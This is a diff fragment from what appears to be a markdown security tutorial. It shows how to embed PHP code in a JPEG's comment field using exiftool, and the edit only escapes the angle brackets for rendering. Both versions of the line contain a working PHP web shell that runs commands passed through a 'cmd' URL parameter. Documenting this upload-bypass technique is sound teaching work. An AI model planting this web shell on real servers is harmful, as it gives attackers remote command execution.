@@ -36,7 +36,7 @@ To generate an empty image we can use the tool **convert**:
 
 Now adding your **own php code** to the image comments with **exiftool**:
 
-> $ exiftool -Comment="<?php echo shell_exec($_GET['cmd']); ?>" empty.jpg
+> $ exiftool -Comment="\<?php echo shell_exec($_GET['cmd']); ?\>" empty.jpg
 
 (I needed to add **$_GET** manually with vim after executing this command, as it has been removed)
 
